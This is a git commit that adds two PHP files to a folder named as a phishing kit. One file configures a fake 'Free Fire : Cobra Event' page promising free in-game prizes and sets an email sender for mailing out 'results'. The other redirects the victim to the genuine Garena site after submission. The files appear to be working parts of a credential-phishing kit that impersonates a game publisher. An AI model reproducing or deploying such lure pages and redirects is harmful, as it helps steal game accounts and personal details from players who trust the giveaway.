66ab848eccf4fe6afb0bca753448e88544513831
nicoxnxx <108467305+nicoxnxx@users.noreply.github.com>
2022-07-07 00:07:04 +0700

    Add files via upload

---
+++ Phising By@wijayastore.id/submit.php
@@ -0,0 +1,3 @@
+<?php
+header("location: https://ff.garena.com/");
+?>
---
+++ Phising By@wijayastore.id/system/setting.php
@@ -0,0 +1,17 @@
+<?php
+// KONTROL UNTUK MENDAPATKAN ZONA WAKTU (JAKARTA)
+date_default_timezone_set('Asia/Jakarta');
+$jamasuk = date('l, d-m-Y h:i:s');
+
+//KONTROL UNTUK DESKRIPSI HALAMAN
+$title = 'Free Fire : Cobra Event';
+$description = 'Cobra Event Sudah Di Mulai! Dapatkan Hadiah Yang Kamu Inginkan Sekarang !!! Hadiah Tersebut Gratis,Dan Tidak di pungut biaya Apapun. Silahkan Ambil hadiah Bersama Teman Teman Kalian!';
+$copyright = 'FREE FIRE';
+$theme = '#000';
+$image = 'https://g.top4top.io/s_18883ujz60.png';
+$icon = 'https://g.top4top.io/s_18883ujz60.png';
+
+// KONTROL UNTUK HALAMAN KIRIM RESULT
+$author = 'RNDYTECH';
+$sender = 'From: RNDYTECH | TRUE ID <rndytech12@gmail.com>';
+?>
